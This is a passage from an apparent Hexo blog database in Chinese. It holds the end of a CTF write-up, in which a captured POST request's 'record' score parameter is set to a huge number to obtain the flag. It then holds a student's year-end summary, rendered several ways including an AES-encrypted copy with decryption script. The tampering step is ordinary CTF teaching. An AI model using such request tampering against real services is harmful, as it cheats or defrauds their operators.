class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点进去拉到最后有几条提示</p>\n<p><img src=\"/pic/8.png\" alt=\"\"></p>\n<p>生成一个http请求，将分数发到服务器，将结果显示。</p>\n<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 183.129.189.60:10001</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: *&#x2F;*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 9</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">record&#x3D;23</span><br></pre></td></tr></table></figure>\n\n<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>\n"},{"title":"年末总结","date":"2019-12-31T15:31:39.000Z","encrypt":"enable","enc_pwd":"7b7a53e239400a13bd6be6c91c4f6c4e","_content":"\n## 年末总结\n\n### 1月\n\n月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。\n\n### 2月\n\n二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。\n\n### 3月\n\n月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。\n\n### 4月\n\n4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。\n\n###  5月\n\n参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。\n\n### 6月\n\n参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。\n\n###  7月\n\n月初又是考试周， 还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。\n\n### 8月\n\n8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!\n\n### 9月\n\n又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。\n\n### 10月\n\n这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。\n\n### 11月\n\n准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。\n\n### 12月\n\n软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。\n\n### 最后\n\n希望新的一年里可以对自己严格一些，多学点东西。早睡早起!","source":"_posts/年末总结.md","raw":"---\ntitle: 年末总结\ndate: 2019-12-31 23:31:39\ntags:\nencrypt: enable\nenc_pwd: 7b7a53e239400a13bd6be6c91c4f6c4e\n---\n\n## 年末总结\n\n### 1月\n\n月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。\n\n### 2月\n\n二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。\n\n### 3月\n\n月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。\n\n### 4月\n\n4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。\n\n###  5月\n\n参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。\n\n### 6月\n\n参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。\n\n###  7月\n\n月初又是考试周， 还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。\n\n### 8月\n\n8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!\n\n### 9月\n\n又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。\n\n### 10月\n\n这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。\n\n### 11月\n\n准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。\n\n### 12月\n\n软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。\n\n### 最后\n\n希望新的一年里可以对自己严格一些，多学点东西。早睡早起!","slug":"年末总结","published":1,"updated":"2020-01-02T08:09:37.720Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4wg88b10001yk7edqhj7r35","content":"<script src=/js/crypto-js.js></script>\n<script>\nfunction doDecrypt (pwd, onError) {\n\tconsole.log('in doDecrypt');\n\tconst txt = document.getElementById('enc_content').innerHTML;\n\tlet plantext;\n\ttry {\n\t\tconst bytes = CryptoJS.AES.decrypt(txt, pwd);\n\t\tvar plaintext = bytes.toString(CryptoJS.enc.Utf8);\n\t} catch(err) {\n\t\tif(onError) {\n\t\t\tonError(err);\n\t\t}\n\t\treturn;\n\t}\n\tdocument.getElementById('enc_content').innerHTML = plaintext;\n\tdocument.getElementById('enc_content').style.display = 'block';\n\tdocument.getElementById('enc_passwd').style.display = 'none';\n\tif(typeof MathJax !== 'undefined') {\n\t\tMathJax.Hub.Queue(\n\t\t\t['resetEquationNumbers', MathJax.InputJax.TeX],\n\t\t\t['PreProcess', MathJax.Hub],\n\t\t\t['Reprocess', MathJax.Hub]\n\t\t);\n\t}\n}\n</script>\n<div id=\"enc_content\" style=\"display:none\">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</div>\n<div id=\"enc_passwd\"> <input id=\"enc_pwd_input\" type=\"password\" style=\"border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;\" onkeydown=\"if (event.keyCode == 13) { decrypt(); return false;}\"> <input type=\"submit\" value=\"解&nbsp;密\" onclick=\"decrypt()\" style=\"width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;\"><div id=\"enc_error\" style=\"display: inline-block;color: #d84527;margin-left: 10px\"></div>\n<script>\nvar onError = function(error) {\n\tdocument.getElementById(\"enc_error\").innerHTML = \"password error!\"\n};\nfunction decrypt() {\nvar passwd = document.getElementById(\"enc_pwd_input\").value;\nconsole.log(passwd);\ndoDecrypt(passwd, onError);\n}\n</script>\n</div>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"年末总结\"><a href=\"#年末总结\" class=\"headerlink\" title=\"年末总结\"></a>年末总结</h2><h3 id=\"1月\"><a href=\"#1月\" class=\"headerlink\" title=\"1月\"></a>1月</h3><p>月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。</p>\n<h3 id=\"2月\"><a href=\"#2月\" class=\"headerlink\" title=\"2月\"></a>2月</h3><p>二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。</p>\n<h3 id=\"3月\"><a href=\"#3月\" class=\"headerlink\" title=\"3月\"></a>3月</h3><p>月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。</p>\n<h3 id=\"4月\"><a href=\"#4月\" class=\"headerlink\" title=\"4月\"></a>4月</h3><p>4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。</p>\n<h3 id=\"5月\"><a href=\"#5月\" class=\"headerlink\" title=\"5月\"></a>5月</h3><p>参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。</p>\n<h3 id=\"6月\"><a href=\"#6月\" class=\"headerlink\" title=\"6月\"></a>6月</h3><p>参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。</p>\n<h3 id=\"7月\"><a href=\"#7月\" class=\"headerlink\" title=\"7月\"></a>7月</h3><p>月初又是考试周， 还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。</p>\n<h3 id=\"8月\"><a href=\"#8月\" class=\"headerlink\" title=\"8月\"></a>8月</h3><p>8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!</p>\n<h3 id=\"9月\"><a href=\"#9月\" class=\"headerlink\" title=\"9月\"></a>9月</h3><p>又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。</p>\n<h3 id=\"10月\"><a href=\"#10月\" class=\"headerlink\" title=\"10月\"></a>10月</h3><p>这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。</p>\n<h3 id=\"11月\"><a href=\"#11月\" class=\"headerlink\" title=\"11月\"></a>11月</h3><p>准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。</p>\n<h3 id=\"12月\"><a href=\"#12月\" class=\"headerlink\" title=\"12月\"></a>12月</h3><p>软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。</p>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><p>希望新的一年里可以对自己严格一些，多学点东西。早睡早起!</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4pc9e54000b187eeg669m47"},{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4pc9e55000e187e7cka5d18"},{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e520009187ef33hfrxm","_id":"ck4pc9e55000f187ecurch409"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4pc9e57000j187e3x7rd3mw"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e54000d187e4zn56trk","_id":"ck4pc9e57000k187e1cv97jbd"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4pc9e58000m187edsfcaj68"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e4z0007187ehnnq07s7","_id":"ck4pc9e59000n187egoxygbo6"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e56000i187e4e8ib1ko","_id":"ck4pc9e5a000q187ee189fhfo"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4pc9e5b000r187e84whc3pe"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4pc9e5b000s187e7odk0o42"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4pc9e5b000t187e2lnb7b7v"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4s68npz0002t47e4g321bt1"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4s68npz0003t47ehe6q1kar"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4s68nq00004t47e9tc5c5he"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4s68npk0001t47edky04y7k","_id":"ck4s68nq00005t47e0ldre2b2"},{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4s68nrd0006t47eh2lo3t4e"},{"post_id":"ck4wcegh50000yo7e74w97qcq","tag_id":"ck4wceghc0001yo7eav4zhw8a","_id":"ck4wceghk0002yo7eam2xf9xl"},{"post_id":"ck4wcegh50000yo7e74w97qcq","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4wceghl0003